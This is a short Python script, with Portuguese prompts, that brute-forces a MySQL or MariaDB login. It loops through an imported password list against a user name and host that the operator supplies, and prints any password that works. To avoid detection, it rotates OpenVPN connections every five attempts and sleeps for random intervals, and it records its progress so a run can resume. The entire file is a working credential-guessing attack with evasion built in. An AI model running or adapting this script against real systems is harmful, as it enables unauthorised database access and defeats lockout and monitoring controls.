import pexpect
import random
import passwords
import time
import vpn

passwords = passwords.passwords_
openvpn_enter = vpn.openvpn_enter_()

finded = False

i = 0

LOGIN_SUCCESS_MARIADB = 0
LOGIN_SUCCESS_MYSQL = 1
LOGIN_DENIED = 2
END = 3
TIMEOUT = 4

i = int(input("Qual o valor inicial: "))

user = input("Qual o usuário: ")
destino = input("Qual o destino: ")

next_ = random.randint(30, 45)
next5 = 5

while i < len(passwords):

    with open("/tmp/mysql_i", "w") as f:
        f.write(str(i))

    process = pexpect.spawn("mysql", ["-u", user, "-p", destino], encoding="utf-8", timeout=10)

    process.expect("Enter password:")
    process.sendline(str(passwords[i]))

    result = process.expect([
        "MariaDB",
        "mysql",
        "ERROR 1698",
        pexpect.EOF,
        pexpect.TIMEOUT,
    ])

    if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
        password = passwords[i]
        print(password)

        finded = True

        with open("/tmp/mysql_finded", "w") as f:
            f.write("True")

        break

    if result == LOGIN_DENIED:
        print("Senha recusada pelo MySQL.")
    elif result == END:
        print("A conexão com o MySQL foi encerrada.")
    elif result == TIMEOUT:
        print("Tempo limite aguardando a resposta do MySQL.")

    if result in (LOGIN_DENIED, END, TIMEOUT):
        process.close()
        i += 1

        if i >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()
            next5 += 5

        continue

    if i == next_:
        time.sleep(random.randint(30, 180))
        next_ += random.randint(30, 45)

    process.interact()

    delay = random.randint(1, 15)
    time.sleep(delay)

    i += 1

openvpn_enter.close()